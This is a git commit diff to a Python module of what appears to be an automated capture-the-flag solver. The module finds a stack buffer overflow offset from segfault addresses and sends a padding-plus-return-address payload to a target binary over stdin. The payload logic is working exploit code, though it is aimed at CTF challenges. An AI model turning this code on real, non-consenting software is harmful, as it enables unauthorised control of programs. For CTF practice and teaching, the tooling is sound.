315b3112f5cf3542d3bf707ad97f40a368534eff
Caleb Stewart <caleb.stewart94@gmail.com>
2019-04-16 12:45:55 -0400

    Fixed up the buffer overflow a bit

--- units/binexp/stdin.py
+++ units/binexp/stdin.py
@@ -12,7 +12,7 @@ class Unit(units.binexp.BasicBufferOverflowUnit):
 			for line in kmsg:
 				if token in line:
 					return int(line.split(' ')[5], 16)
-		return 0
+		return None
 
 	def __init__(self, katana, parent, target):
 		super(Unit, self).__init__(katana, parent, target)
@@ -33,14 +33,15 @@ class Unit(units.binexp.BasicBufferOverflowUnit):
 				# Did we get a segfault?
 				if p.returncode == -11:
 					address = self.get_segfault_address(p.pid)
-					try:
-						decoded = p32(address & 0xFFFFFFFF).decode('utf-8')
-					except:
-						pass
-					else:
-						if cyclic_find(decoded) != -1:
-							self.offset = cyclic_find(decoded)
-							return
+					if address is not None:
+						try:
+							decoded = p32(address & 0xFFFFFFFF).decode('utf-8')
+						except:
+							pass
+						else:
+							if cyclic_find(decoded) != -1:
+								self.offset = cyclic_find(decoded)
+								return
 
 
 			except subprocess.TimeoutExpired:
@@ -53,13 +54,39 @@ class Unit(units.binexp.BasicBufferOverflowUnit):
 
 	def evaluate(self, katana, function):
 
-		p = self.elf.process()
-		p.send(b'A'*self.offset + p32(function))
-		p.shutdown('send')
-		results = p.recv().decode('utf-8')
+		payload = b'A'*self.offset + p32(function)
+		p = subprocess.Popen([self.target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+				stderr=subprocess.PIPE)
 
-		katana.locate_flags(self, results)
-		katana.recurse(self, results)
-		katana.add_results(self, results)
+		try:
+			stdout, stderr = p.communicate(input=payload, timeout=katana.config['timeout'])
+			result = p.returncode
+		except subprocess.TimeoutExpired:
+			p.kill()
+			stdout, stderr = p.communicate()
+			result = 'execution timed out'
+
+		if p.returncode == -11:
+			segaddr = hex(self.get_segfault_address(p.pid))
+		else:
+			segaddr = None
+
+		stdout = stdout.decode()
+		stderr = stderr.decode()
+
+		katana.locate_flags(self, stdout)
+		katana.locate_flags(self, stderr)
+		katana.recurse(self, stdout)
+		katana.recurse(self, stderr)
+		katana.add_results(self, {
+			'cmdline': self.target,
+			'stdin': ''.join([ '\\x{0:02x}'.format(c) if c < 32 or c >= 127 else chr(c) for c in payload]),
+			'stdout': stdout,
+			'stderr': stderr,
+			'result': result,
+			'segfaul_addr': segaddr,
+			'offset': self.offset,
+			'pid': p.pid
+		})
 
 		pass
